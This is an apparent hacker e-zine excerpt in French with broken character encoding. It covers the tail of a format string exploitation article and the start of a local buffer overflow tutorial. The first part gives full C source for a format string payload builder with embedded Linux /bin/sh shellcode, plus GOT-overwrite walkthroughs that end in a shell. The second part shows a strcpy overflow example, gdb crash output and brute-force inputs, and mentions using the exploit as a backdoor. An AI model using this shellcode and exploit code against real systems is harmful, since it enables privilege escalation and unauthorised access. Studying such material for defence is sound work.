8048540.4000b3c0.bfffeaec.40015634.       2.bfffebf2.bfffebf7. 
0.bffffbf8.bffffc11.bffffc20.bffffc31.bffffc3f.bffffc49.bffffc5c.bffffc79.bffff
c84.bffffc92.bffffd29.bffffd39.bffffd4e.bffffd5e.bffffd70.bffffd77.bffffd9f.bff
ffdad.bffffdef.bffffdf7.bffffe09.bffffe2a.bffffe37.bffffe3f.bfffffed.       0. 
10.  8001bf.       6.    1000.      11.      64.       3. 8048034.       4. 
20.       5.       6.       7.40000000.       8.       0.       9. 8048380. 
b.     cf6.       c.     cf6.       d.     34d.       e.     34d. 
f.bfffebed.       0.       0.       0.       0. 
0.38356900.65740036.41007473.be414141      ------------------------------------
--------------------------------------^^---------^^^^^^
                                                                                                                                                                            146456250be080497                                                                                                                                                                                                                                        163233466be080497     180010682be080497                                                                                               
[fin du garbage...]

Yay ! Nous avons enfin atteint la bonne distance pour rejoindre le dΘbut du 
buffer que nous contr⌠lons.  Reste maintenant juste α trouver le bon alignement 
pour Ωtre capable d'aligner sur 4 bytes nos donnΘes.

guaylejs@ariel [~/codez/format_string/mindkind]$ ./lib 101 1 0x8049708 test 1

[debut du garbage...]

. 8049708. 8048451. 8049620. 80496e8.bfffea98.4004bbe8.4013a290.4000acf0. 804970
8.bfffeac8.40038326.       2.bfffeaf4.bfffeb00. 8048540.       0.bfffeac8.400382
f6.40015094.       2. 8048380.bfffeaf4.40038268.40138ac8.       0. 80483a1. 8048
470.       2.bfffeaf4. 80482e4. 8048540.4000b3c0.bfffeaec.40015634.       2.bfff
ebf2.bfffebf7.       0.bffffbf8.bffffc11.bffffc20.bffffc31.bffffc3f.bffffc49.bff
ffc5c.bffffc79.bffffc84.bffffc92.bffffd29.bffffd39.bffffd4e.bffffd5e.bffffd70.bf
fffd77.bffffd9f.bffffdad.bffffdef.bffffdf7.bffffe09.bffffe2a.bffffe37.bffffe3f.b
fffffed.       0.      10.  8001bf.       6.    1000.      11.      64.       3.
 8048034.       4.      20.       5.       6.       7.40000000.       8.       0
.       9. 8048380.       b.     cf6.       c.     cf6.       d.     34d.
e.     34d.       f.bfffebed.       0.       0.       0.       0.       0.383569
00.65740036.2e007473.41414141
---------------------^^^^^^^^

                                            -11619054748049708


                                                    -11619054748049709   -116190


[fin du garbage...]

Finalement, nous avons rΘussi α trouver les bonnes valeurs pour enfin contr⌠ler
notre buffer, nous avons trouvΘ comme  distance 101 et comme alignement 1.   De
plus  nous  possΘdons notre  retloc,  Θgale α  0x8049708.   Essayons maintenant
d'appeler `lib` avec les arguments prΘcis.  

guaylejs@ariel [~/codez/format_string/mindkind]$ ./lib

./lib &lt;dist> &lt;align> &lt;retloc> &lt;what> &lt;mode>

guaylejs@ariel [~/codez/format_string/mindkind]$
guaylejs@ariel [~/codez/format_string/mindkind]$ ./lib 101 1 0x8049708 "yay d-natural est mon nom... poum ti pou pa ti pou waaai... yo :P" 2 | grep string
RETLOC (Adresse de string) -> 0x8049708
string avant attaque -> jonny boy!!! ;)
string apres attaque -> yay d-natural est mon nom... poum ti pou pa ti pou waaai... yo :P
guaylejs@ariel [~/codez/format_string/mindkind]$

Et voilα le travail !  Nous avons  modifier une string en mΘmoire ! C'est  bien
beau Ωtre  capable d'Θcrire  une string  en mΘmoire,  mais comment cela peut-il
nous faciliter le travail lorsque nous voulons exploiter un programme ?  



--[ ╔crivons le shellcode en mΘmoire

Nous sommes maintenant capables d'Θcrire  une string en mΘmoire, α  une adresse
que  nous dΘterminons.   Tout le  monde sait  aussi qu'un  shellcode c'est  une
string.  Donc  si nous  savons α  quel endroit  en mΘmoire  nous pouvons placer
notre string (shellcode), nous savons automatiquement quelle sera la valeur  de
retadr, sans  avoir besoin  de la  bruteforcer.  Nous  allons donc  Θliminer un
'offset'  α  bruteforcer,  donc   plus  de  chances  pour   que  l'exploitation
fonctionne.

Plusieurs endroits diffΘrents s'offrent α  nous pour placer notre shellcode  en
mΘmoire qui  seront valides.  Je vous  en prΘsente  2 qui  sont intΘressantes α
travailler.  Pour saisir le contr⌠le de votre EIP, j'utilise l'Θcrasement d'une
entrΘe dans  GOT... Vous  pouvez tout  aussi bien  utiliser une  des techniques
prΘcΘdemment mentionnΘes dans le 'rappel' : 

PrΘsentons maintenant le prototype de la fonction qui sera utilisΘe pour Θcrire
le shellcode en mΘmoire :

void write_sc_fmt (char *buffer, int dist, int align, int retloc, int retadr, char
*what, int mode);

- buffer : Le buffer qui contiendra la format string
- int dist : La distance jusqu'au dΘbut du buffer que nous controlons
- int align : Une valeur de 0 α 3 dΘfinissant l'alignement sur 4 bytes
- int retloc : L'endroit que o∙ nous voulons Θcrire la string
- int retadr : L'endroit o∙ nous voulons Θcrire le shellcode, et la valeur que
               nous allons Θcraser retloc avec.
- int mode : 1 pour le mode d'alignement, et 2 pour Θcrire en mΘmoire.
(le  mode  d'alignement  nous  permet  de  trouver  exactement  la  distance et
l'alignement pour atteindre notre buffer, tandis qu'avec 2 nous voulons  Θcrire
en mΘmoire; voir code)

--[ ╔crivons-le o∙ exactement ?!?!

- AprΦs une entrΘe dans la GOT
Ici,  nous  allons Θcraser  une  entrΘe dans  la  GOT d'une  fonction  qui sera
utilisΘe sous  peu aprΦs  la fonction  de formatage  vulnΘrable... Nous  allons
faire pointer  l'entrΘe de  la GOT  que nous  avons choisie  avec l'adresse  de
GOT[index de la fonction]  + 4.  C'est Θvident;  maintenant, au lieu d'avoir  α
chercher le 'retadr' qui contient notre shellcode, nous allons nous mΩme Θcrire
notre  shellcode aprΦs  l'adresse que  nous avons  trouvΘe, ce  qui Θlimine  la
recherche de notre 'retadr'.  C'est α cet endroit que nous allons placer  notre
shellcode.   Examinons un  peu l'image  de notre  process lorsque  nous  allons
rouler le  programme, et  voir si  nous n'Θcrasons  rien en mΘmoire d'important
lorsque nous allons insΘrer notre shellcode.  

Examinons les diffΘrentes sections lorsqu'elles seront mappΘes en mΘmoire [4]:

guaylejs@ariel [~/codez/format_string/mindkind]$ readelf -S ./test
There are 30 section headers, starting at offset 0x29b0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        080480f4 0000f4 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048108 000108 000020 00   A  0   0  4

[...]	

->[19] .got              PROGBITS        08049620 000620 000028 04  WA  0   0  4
  [20] .dynamic          DYNAMIC         08049648 000648 0000a0 08  WA  5   0  4
  [21] .sbss             PROGBITS        080496e8 0006e8 000000 00   W  0   0  1
  [22] .bss              NOBITS          080496e8 0006e8 000018 00  WA  0   0  4
  [23] .stab             PROGBITS        00000000 0006e8 00078c 0c     24   0  4
  [24] .stabstr          STRTAB          00000000 000e74 0018f7 00      0   0  1
  [25] .comment          PROGBITS        00000000 00276b 0000e4 00      0   0  1

[...]

Donc nous  voyons que  nous avons  un jeu  aprΦs notre  GOT pour pouvoir Θcrire
notre shellcode, aprΦs les sections suivantes (.dynamic et .bss) [4].  Si  nous
Θcrasons une de ces 2 sections,  nous n'allons pas modifier le comportement  du
programme d'ici  l'exploitation, car  rien de  critique n'accΦde  α ces donnΘes
entre l'Θcrasement  de la  GOT et  l'hijack du  programme.  Les sections .stab,
.stabstr et suivantes ne sont pas  mappΘes en mΘmoires car elles possΦdent  une
adresse Θgale  α 0x000000000.   Pour l'exemple  que je  vais vous montrer, nous
allons utiliser l'entrΘe de 'printf' dans la GOT :

guaylejs@ariel [~/codez/format_string/mindkind2]$ objdump -R test | grep printf
0804963c R_386_JUMP_SLOT   printf
guaylejs@ariel [~/codez/format_string/mindkind2]$

Nous avons  donc notre  retloc qui  est Θgale  α 0x0804963c.   Nous allons donc
placer notre shellcode α 0x0804963c+4, donc 0x08049640.


guaylejs@ariel [~/codez/format_string/mindkind2]$ ./lib

./lib &lt;dist> &lt;align> &lt;retloc> &lt;retadr> &lt;mode>

guaylejs@ariel [~/codez/format_string/mindkind2]$
guaylejs@ariel [~/codez/format_string/mindkind2]$ ./lib 101 1 0x0804963c 0x08049640 2

[...]

bash$

Yes sir !  Nous avons rΘussi α l'exploiter...
Essayons maintenant de mettre le shellcode sur la stack...

- Somewhere into the staccccck

Maintenant, essayons d'insΘrer notre shellcode  α un autre endroit en  mΘmoire.
Plaτons-le,  pour  cet  exemple,  directement  sur  la  stack.   Appelons notre
programme de la  mΩme faτon que  prΘcΘdemment, mais changeons  l'emplacement de
notre retadr, et d'ainsi l'endroit o∙ notre shellcode va Ωtre entreposΘ : 
	
guaylejs@ariel [~/codez/format_string/mindkind2]$ ./lib 101 1 0x0804963c 0xbffffdaa 2

[...]

bash$

Vous commencez s√rement α piger le concept ! 	

Bref, avec cette technique, le seul  offset que nous avons α trouver,  c'est le
retloc.  Notre shellcode, nous pouvons le placer o∙ nous voulons en mΘmoire, en
s'assurant bien  s√r que  nous avons  le droit  d'Θcrire α  cet endroit dans la
mΘmoire, et que nous n'Θcrasons pas de valeurs importantes pour ne pas dΘranger
le dΘroulement  du programme,  du moins  jusqu'α temps  que nous  saisissons le
contr⌠le sur celui-ci.


--[ Conclusion

MalgrΘ le  fait que  les attaques  par format  string se  font de  plus en plus
rares,  il  reste  toujours  intΘressant  de  jouer  avec  une  telle   mΘthode
d'exploitation, car elle est trΦs flexible et nous pouvons faire pas mal ce que
nous voulons en mΘmoire.   En espΘrant que cet  article vous a ouvert  l'esprit
sur l'exploitation et qu'il vous a aussi donnΘ le go√t d'en savoir plus...	

--[ Le code

--[ lib.c
/*

   Cette version du programme nous permettra d'Θcrire un shellcode en mΘmoire
   et de prendre le contr⌠le du programme α l'aide d'un format string attack.

   Pour Θcrire en mΘmoire une string de votre choix, (strcpy improvisΘ), veuillez
   Θchanger le main () qui suit avec le main () en commentaires α la fin du code.

   CodΘ par g463

*/

#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;unistd.h>
#include &lt;string.h>

#define DUMMY  0xbabebabe      // si taimes les lesbi.
//#define DUMMY 0xdeadbabe     // ou la necrophilie...
#define SEARCH 0x41414141

char sc_linux[] =
                "\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
                "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

#define ALIGN_MODE   1
#define EXPLOIT_MODE 2

char *write_4 (char *buffer, long what);
char *search_dist (char *buffer, int dist);
void write_sc_fmt (char *buffer, int dist, int align, int retloc, int retadr, char
*what, int mode);
void write_string_fmt (char *buffer, int dist, int align, int retloc, char *what, int mode);
void usage (char *progname);

int 
main (int argc, char *argv[]) {

   char *buffer = (char *) malloc (4096);
   int i, j;
   int retloc, retadr;

   if (argc != 6)
      usage (argv[0]);

   memset (buffer, 0x42, sizeof (buffer));

   retloc = strtoul (argv[3], NULL, 16);
   retadr = strtoul (argv[4], NULL, 16);

   write_sc_fmt (buffer, atoi (argv[1]), atoi (argv[2]),
                     retloc,
                     retadr,
                     sc_linux,
                     atoi (argv[5]));

   // Make sure the lenght of our buffer is always fixed
   for (i = 0; i < 4096; i++)
      if (buffer[i] == 0x0) buffer[i] = 0x42;
   buffer[i] = 0x0;

   execl ("./test", "test", buffer, (char *) 0);

   return 0;
}

char *write_4 (char *buffer, long what) {

   int i = 0;

   buffer[i++] = (what & 0x000000ff);
   buffer[i++] = (what & 0x0000ff00) >> 8;
   buffer[i++] = (what & 0x00ff0000) >> 16;
   buffer[i++] = (what & 0xff000000) >> 24;

   return (char *) &buffer[i];
}

char *search_dist (char *buffer, int dist) {

   int i;
   char pop_it[] = ".%8x";

   for (i = 0; i < dist; i++)
      strcat (buffer, pop_it);

   return (char *) (buffer + (strlen (pop_it) * dist));
}

void write_sc_fmt (char *buffer, int dist, int align, int retloc, int retadr, char *what, int mode) {


   char *ptr = buffer, *what_ptr;
   int written_bytes = 0, write_byte, padding;
   int i;

   for (i = 0; i < align; i++) {
      buffer[i] = '.';
      written_bytes++;
      ptr++;
   }

   ptr = write_4 (ptr, SEARCH);
   written_bytes += 4;

   // Pushons les adresses pour notre retadr
   for (i = 0; i < 4; i++) {
      ptr = write_4 (ptr, DUMMY);
      ptr = write_4 (ptr, retloc+i);
   }
   written_bytes += (4 * (i * 2));

   // Pushons les adresses pour notre string
   for (i = 0; i < strlen (what) + 1; i++) {
      ptr = write_4 (ptr, DUMMY);
      ptr = write_4 (ptr, retadr+i);
   }
   written_bytes += (4 * (i * 2));

   ptr = search_dist (ptr, dist);
   written_bytes += (dist * 9);

   what_ptr = what;
   for (i = 0; i < (strlen (what) + 1 + 4); i++) {

      if (i < 4) {
         write_byte = (retadr & 0x000000ff) + 0x100;
         retadr = retadr >> 8;
      } else {
         write_byte = what_ptr[i-4] + 0x100;
      }

      written_bytes %= 0x100;

      padding = (write_byte - written_bytes) % 0x100;

      if (padding < 14)
         padding += 0x100;

      ptr = buffer + strlen (buffer);

      if (mode == ALIGN_MODE)
         sprintf (ptr, "%%%dd%%x", padding);
      else
         sprintf (ptr, "%%%dd%%n", padding);

      written_bytes += padding;
   }
}

void write_string_fmt (char *buffer, int dist, int align, int retloc, char *what, int mode) {

   char *ptr = buffer, *what_ptr;
   int written_bytes = 0, write_byte, padding;
   int i;

   for (i = 0; i < align; i++) {
      buffer[i] = '.';
      written_bytes++;
      ptr++;
   }

   ptr = write_4 (ptr, SEARCH);
   written_bytes += 4;

   for (i = 0; i < strlen (what) + 1; i++) {
      ptr = write_4 (ptr, DUMMY);
      ptr = write_4 (ptr, retloc+i);
   }
   written_bytes += (4 * (i * 2));

   ptr = search_dist (ptr, dist);
   written_bytes += (dist * 9);

   what_ptr = what;
   for (i = 0; i < (strlen (what) + 1); i++) {

      write_byte = what_ptr[i] + 0x100;

      written_bytes %= 0x100;

      padding = (write_byte - written_bytes) % 0x100;

      if (padding < 14)
         padding += 0x100;

      ptr = buffer + strlen (buffer);

      if (mode == ALIGN_MODE)
         sprintf (ptr, "%%%dd%%x", padding);
      else
         sprintf (ptr, "%%%dd%%n", padding);

      written_bytes += padding;
   }
}

/*

int
main (int argc, char *argv[]) {

   char *buffer = (char *) malloc (4096);
   int i, j;
   int retloc;

   if (argc != 6)
      usage (argv[0]);

   memset (buffer, 0x42, sizeof (buffer));

   retloc = strtoul (argv[3], NULL, 16);

   write_string_fmt (buffer, atoi (argv[1]), atoi (argv[2]),
                     retloc,
                     argv[4],
                     atoi (argv[5]));

   // Make sure the lenght of our buffer is always fixed
   for (i = 0; i < 4096; i++)
      if (buffer[i] == 0x0) buffer[i] = 0x42;
   buffer[i] = 0x0;

   execl ("./test", "test", buffer, (char *) 0);

   return 0;
}

*/

--] eof

--[ RΘfΘrences

[1] : Wu-ftpd exploit
http://packetstormsecurity.nl/9903-exploits/wu-ftpd-beta18-root.txt

[2] : Sudo exploit
http://www.synnergy.net/downloads/exploits/vudo.c

[3] : Format String exploitation
http://www.team-teso.net/releases/formatstring-1.2.tar.gz

[4] : Documentation ELF
http://www.muppetlabs.com/~breadbox/software/ELF.txt

--[ Remerciements pour cet article

* α #mindkind, pour le support, l'entraide, l'Θnergie et surtout leur patience ;)
* α #2e2h pour l'entraide et les idΘes sur les format strings attacks




            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                g463@mindkind.org                        /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




                                                                          
 Mindkind Nord-Korean                                                     
 Nuclear Facility.                                                        
 Producing EliteActive E-zine                                             
 ... And some usefull mass-destruction weapon ...                         
                                                                          
                  ############################                            
                    ###``````````````````###                              
                      ##````````````````##                                
                       #````````````````#                                 
                       #```````````````############################       
                       #````````````````####``````````````````###         
                       #````````````````#  ##````````````````##           
                       #````````````````#   #````````````````#            
                       #````````````````#   #````````````````#            
                       #````````````````#   #````````````````#            
                      ##````````````````##  #````````````````#            
                    ###``````````````````####````````````````#            
                  ####````````````````````###````````````````#            
              ######````````````````````````#````````````````#            
           ##################################````````````````##           
    ,,,,,,,,,,,,,,,,,,,,,,,,,,,          ###``````````````````###         
   /                         /|        ####````````````````````####       
  +-------------------------+ |    ######````````````````````````######   
  |                         | | ##########################################
  | [] [] [] [] [] [] [] [] | |  ,,,,,,,,,,,,,,,,,,,,,,,,,,,              
  |                         | | /                         /|              
  | [] [] [] [] [] [] [] [] | |+-------------------------+ |              
  |                      +--| ||                         | |              
  | [] [] [] [] [] [] [] |oo| || [] [] [] [] [] [] [] [] | |              
  |                      | '|/ |                         | |              
  '''''''''''''''''''''''''''  | [] [] [] [] [] [] [] [] | |              
                               |                      +--| |              
                               | [] [] [] [] [] [] [] |oo| |              
                               |                      | '|/   -init_null  
                               '''''''''''''''''''''''''''                
                                                                          
                                                                          


                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.09  Buffer Overflow pour les 0x90                   \        \     !
     .             aka                                         \        \    .
     ;   When doing a local buffer overflow is easier than      \        \   :
     :   finding a girlfriend                                    \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Cet article  traitera de  comment faire  un buffer  overflow sur  un exΘcutable
linux i386  ia32 local.  Contrairement aux  articles dΘjα  paru sur les buffers
overflow de type local, nous n'utiliserons pas d'exemple prΘfab. Nous tenterons
(et  rΘussirons)  d'exploiter  strfile,  un  utilitaire  du  package  bsd-games
(fortune cookie) dans un environnement linux slackware 8.0 . L'accent sera  mit
sur le comment plus que le pourquoi,  le but de cet article Θtant de  dΘmontrer
en milieu rΘel la crΘation d'un exploit de type buffer overflow local. Lα o∙ τa
se   passe   vraiment  quoi.   Des  connaissances     minimums   en     systΦme
d'exploitation linux et en programmation  (les codes prΘsentΘs ici seront  en C
et ASM, mais la non-connaissance de ces langages n'entraεne pas automatiquement
une non-comprΘhension de cet article, il est tout α fait possible de comprendre
les  exemples donnΘs  si vous  pratiquez dΘjα  la programmation  sous un  autre
langage). Vous pouvez donc voir cet article comme une vulgarisation des buffers
overflow. L'accent  sera donc  mit sur  ce qui  est important  pour rΘussir. Je
proposerais aussi une solution tout en un qui permettra d'exploiter la  plupart
des buffers overflow d'argument local  avec un seul exploit. Strfile  n'est pas
suid root, mais  on peut se  servir de cet  exploit comme une  backdoor sur une
machine dΘjα rootΘ.

L'article sera  sΘparΘ en  2 parties  majeures, la  premiΦre partie, thΘorique,
rΘcapitule de faτon gΘnΘralisΘ ce qui est nΘcessaire de savoir. Cette thΘorie a
dΘjα ΘtΘ expliquΘ de diffΘrentes faτons, je la reprends donc ainsi a la  mienne
en tant qu'introduction α l'exploit de  strfile. Nous en venons donc α  la 2Φme
section  qui traitera  de l'exploitation  de strfile  de faτon  pratique et  se
terminera par la confection d'un exploit en C.


La thΘorie

Un buffer overflow  se produit lorsqu'on  tente d'Θcrire en  mΘmoire le contenu
d'une variable dont la grandeur en  bytes dΘpasse celle prΘvue α cet  effet par
le  programme  lui-mΩme.  Les  donnΘes qui  se  retrouverons  en  surplus iront
rΘΘcrire par dessus les  valeurs prΘcΘdentes dans la  stack (la stack Θtant  la
partie de  mΘmoire o∙  sont stockΘs  les arguments  et les  variables locales).
Pourquoi celle  qui  prΘcΦde  ? Et   bien car  dans la  stack tout  ce qui  est
inscrit dΘbute α la fin, un  peu comme lorsqu'un arabe Θcrit. Donc  la premiΦre
variable α  entrer sera  α la  fin de  la stack.  Ensuite la  deuxiΦme variable
viendra s'ajouter  "en dessous".  Mais pourquoi  donc si  la 2Φme  variable est
overflowΘe son contenu viendra se dΘverser dans la premiΦre ? Et bien c'est que
dans chaque variable  le contenu est  Θcrit du bas  vers le haut  dans l'espace
allouΘe α cette variable.


wtf ?
Un ascii s'impose afin de mieux digΘrer tout τa.


End of user Memory
,----------------,
|                |   bon la stack est la zone situer α la fin de la mΘmoire
|  S       |     |   allouΘe par le OS α un process. Dans cette zone sont 
|  T       |     |   situΘes toute les variables utilisΘes par le process.
|  A       |     |   Pour une procΘdure qui contient 4 variables, la premiΦre
|  C       |     |   s'installera dans le haut de la stack la 2iΦme viendra
|  K       |     |   ensuite en dessous de la premiΦre et la 3iΦme en dessous
|          |     |   de la 2iΦme et ainsi jusqu'α la fin.
|          |     |   
|         \ /    |
|          '     |
|________________|


      End of user Memory
      ,----------------,
      |1Φre procΘdure  |    
S  |  | var1 / \       |    
T  |  | var2  |        |    
A  |  | var3  |        |    
C  |  | var4  |        |    
K  |  |________________|    
   |  |2iΦme procΘdure |    
   |  | var1 / \       |    
  \ / | var2  |        |
   '  | var3  |        |
      | var4  |        |
      |                |
      





        ____         ,-------------------------------------------------
       /    \        |  Bien que τa ne soit pas nΘcessaire α la rΘussite
      |  _   |       |  d'un buffer overflow local, certains d'entre vous
      | / \  |       |  aimeraient sans doute avoir un supplΘment 
      ||   | |      /   d'information sur la stack et l'organisation de la
      (.) (.)|     /    mΘmoire en gΘnΘral. 
      ||   | |    <__  
      ||   | | |     |  Pour chaque process (un process Θtant un programme
      ||   | | |     |  s'exΘcutant) une zone de mΘmoire virtuelle de
      |____/|| |     |  4 gig est dΘfinie. Cette zone est divisΘe en 2,
      |\___/ | |     |  l'espace kernel et l'espace user. C'est avec l'espace
      ||   | | |     |  user que nous aurons affaire dans cet article.
      ||   | | |     |  Voici donc α quoi ressemble la totalitΘ de la 
      ||   | | |     |  mΘmoire. 
      ||     | |       
      | \___/  |      
      |        |        ,----------------,
       \______/         | K              | Cette zone mΘmoire n'est accessible
                        | E              | que par le kernel, il est impossible
                        | R              | pour un user d'y lire ou d'y Θcrire.
                        | N    S         | 
                        | E    P         |
                        | L    A         |
                        |      C         |
                        |      E         |
                        |                |
                        |                |
                        |                |
                        |                |
                        |________________|
                        |		 | C'est dans la stack que sont storΘes
                        |          |     | les arguments et les variables locales 
                        |  STACK   |     | d'une procΘdure, chaque procΘdure  
                        |         \ /    | d'un programme dispose de son endroit 
                        |          '     | dans la stack qui est appelΘ
                        |         / \    | "FRAME". c'est α l'intΘrieure d'un
                        |  HEAP    |     | de ces frames que nous ferons notre
                        |          |     | buffer overflow. Le heap sert α 
                        |________________| storer les vars dynamiques ex :malloc().
                        |  BSS           | c'est dans le bss que se retrouve
                        |________________| les donnΘes globales non initialisΘes.
                        |  DATA          | le data est dΘfini par les 
                        |________________| constantes.
                        |  TEXT          | C'est dans le segment text que se
                        |________________| trouve le code α exΘcuter. Cette
                                           partie est unwritable. 


                        La  mΘmoire  rΘservΘe  α la  stack  dΘbute  α l'adresse
                        0xbfffffff. En fait,  il s'agit de  la fin de  l'espace
                        user puisque la stack se lit a l'envers du reste de  la
                        mΘmoire. Tel que dΘmontrΘ dans le graphique. Bref qu'on
                        dise que  la user  space fini  a 0xbfffffff  ou que  la
                        stack dΘbute α 0xbfffffff, c'est la mΩme chose. 

                        Dans la  stack les  donnΘes s'empilent  vers le  bas en
                        suivant la loi fondamentale, last in first out. C'est α
                        dire que le dernier entrΘ est le premier α en sortir. 
 

Bon, tout τa est bien beau, mais a quoi τa sert ? 

He bien, lors de la crΘation d'une procΘdure, le systΦme se donne 2 indices qui
lui  permettrons de  se repΘrer  par la  suite. Il  s'agit de  2 registes,  qui
contiennent les  endroits en  mΘmoires ou  retourner lorsque  la procΘdure aura
fini d'Ωtre appliquΘe, il se retrouve au dΘbut de la procΘdure auquel ils  sont
rattachΘs, avant les variables.. ces registres sont appelΘs en ASM eip et  ebp.
Ainsi donc, lorsqu'on enverra par  argument α la variable une  valeur dΘpassant
la grandeur rΘservΘe en mΘmoire de celle ci nous pourrons rΘΘcrire la valeur de
eip et nous le redirigerons α l'adresse mΘmoire o∙ nous avons crΘΘ notre buffer
overflow dans lequel nous aurons  introduit un shellcode. Le shellcode  est une
suite d'instructions ASM  qui "gΘnΘralement" sert  α exΘcuter /bin/sh  avec les
privilΦges du programme que nous exploitons. 


wtf ?



        End of user Memory
      ,------------------,
      |1Φre procΘdure eip|    Donc en temps normal, dans eip est 
S  |  |               ebp|    indiquΘ l'adresse ou devra retourner
T  |  |                  |    en mΘmoire pour continuer l'exΘcution
A  |  |          var1 / \|    du programme. Nous, en faisant un buffer
C  |  |          var2  | |    overflow, nous disposons de la grandeur
K  |  |          var3  | |    du buffer pour Θcrire un programme
   |  |          var4  | |    que nous ferons exΘcuter en modifiant
   |  |__________________|    eip α la fin de notre buffer overflow
  \ / |2Φme procΘdure eip|    pour qu'il "continue" dans notre code
      |               ebp|    a nous que nous avons injectΘ dans la
      |                  |    variable via le passage d'un argument.
      |          var1 / \|    autrement dit, si notre buffer se situe
      |          var2  | |    dans la 3iΦme variable de la premiΦre
      |          var3  | |    procΘdure, nous devrons Θcraser le
      |          var4  | |    contenue des 2 premiΦres variables afin
                              d'accΘder au eip.  


Qu'est-ce que eip et ebp ?

eip et ebp  sont 2 registres  qui contiennent des  adresses hexadΘcimales d'une
grandeur de 4 bytes. ebp ,  extended base pointer, aussi appelΘ frame  pointer,
c'est dans ebp que se trouve la  location en mΘmoire du frame prΘcΘdant. eip  ,
extended instruction  pointer rΘfΦre  α l'adresse  o∙ le  programme doit jumper
pour continuer sainement  son exΘcution. C'est  le eip qui  nous intΘresse, car
c'est en modifiant cette valeur  que nous pourrons indiquer au  process d'aller
lire notre shellcode plut⌠t que de continuer sont exΘcution tel que prΘvu.
 

Pourquoi ?

Certaines fonctions en C  ne prennent pas compte  de la grandeur des  variables
qu'ils copient en  mΘmoire, la plus  connu est strcpy(),  c'est gΘnΘralement de
strcpy() qu'on se  sert dans les  textes qui traitent  de buffer overflow  pour
crΘer  un  environnement  exploitable artificiel.  Parmi  les  autres fonctions
vulnΘrables,  on  retrouve  strcat(),  sprintf(),  vsprintf(),  gets(),  et les
*scanf(), d'autres fonctions peuvent mener α un buffer overflow dΘpendamment de
leur utilisation. 


Exemple :


#include &lt;stdio.h>




main (int argc, char *argv[])
	{

	char buffer1[20];
	char buffer2[256];

	
	if (argc > 2)
		{
		strcpy(buffer1,argv[1]);
		strcpy(buffer2,argv[2]);
		}
		else 
		{
		printf("this crap needs 2 arguments\r\n");
		}
	}


Donc dans ce code, si  l'on passe en argument α  buffer1 une valeur de plus  de
256 bytes, le surplus va dΘborder dans buffer2 et le programme va continuer son
exΘcution  normalement  (puisque  ce  code  ne  s'attend  α  aucune  valeur  en
particulier  et  ne  fait  rien  d'autre  que  de  copier  arg1  en  mΘmoire (a
l'intΘrieur de buffer1).  

Nous allons donc essayer α l'aide de gdb et d'une fonction pratique en Perl  de
trouver α  quel endroit  se trouve  le eip  du code  prΘcΘdant. Lorsque se sera
fait, nous pourrons nous attaquer α strfile et crΘer l'exploit.

Le caractΦre "`" permet de passer une autre commande en argument, c'est donc le
rΘsultat de la commande entre ``  qui apparaεtra et non la commande  elle mΩme.
Perl possΦde  le mΩme  genre de  caractΦre "'"  qui permet  les mΩme fonctions,
comme c'est 2 balises sont diffΘrentes, il nous est donc possible de passer  le
rΘsultat  d'une commande  α une  autre commande  afin d'arriver  α un  rΘsultat
global.


Ex: 

[encoder@localhost encoder]$ echo `perl -e 'print "A"x20'`
AAAAAAAAAAAAAAAAAAAA
[encoder@localhost encoder]$

Ainsi  nous avons  passΘ en  commentaire α  la commande  echo 20  A. Nous  nous
servirons de cette particularitΘ afin de construire nos buffers tests qui  nous
servirons α identifier le nombre de bytes nΘcessaire pour rΘΘcrire eip.


[encoder@localhost test]$ gdb test2 -q
(gdb) r `perl -e 'print "B"x20'` `perl -e 'print "A"x304'`
Starting program: /home/encoder/hack/test/test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x304'`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) p $eip
$1 = (void *) 0x41414141
(gdb)

(41 Θtant la valeur hexadΘcimal de A, on sait donc ainsi qu'on a rΘΘcrit 4  "A"
sur la valeur de eip)

Comment savoir le nombre de bytes nΘcessaire pour remplir un buffer ? He  bien,
il suffit de compter.

eip(4bytes) + ebp(4bytes) + int argc(4bytes) + 
char* argv[1](3 x 4bytes (2 argument + prog name)) + buffer1(20bytes) +
buffer2(256bytes) 

donc 4 + 4 + 4 + 12 + 20 + 256 = 300

Je dois spΘcifier que je travail sur un systΦme red hat, et que red hat afin de
se protΘger des nombreux  exploits dΘjα existant a  son Θgard fait ajouter  une
valeur de  4 bytes  aprΦs le  ebp. Ainsi  donc nous  arrivons enfin α notre 304
bytes de buffer.  Sous un systΦme  slackware, comme nous  tenterons d'exploiter
plus tard, notre buffer aurait ΘtΘ de 300bytes.

Il faut aussi  savoir que dans  la stack toute  les variables sont  paddΘes a 4
bytes. Donc  toute les  buffers auront  nΘcessairement un  multiple de  4 comme
grandeur.

Une autre faτon plus brainless de trouver la rΘponse aurait ΘtΘ de  bruteforcer
carrΘment la grandeur du buffer.

[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x256'`
[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x266'`
[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x276'`
[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x286'`
[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x296'`
[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x306'`
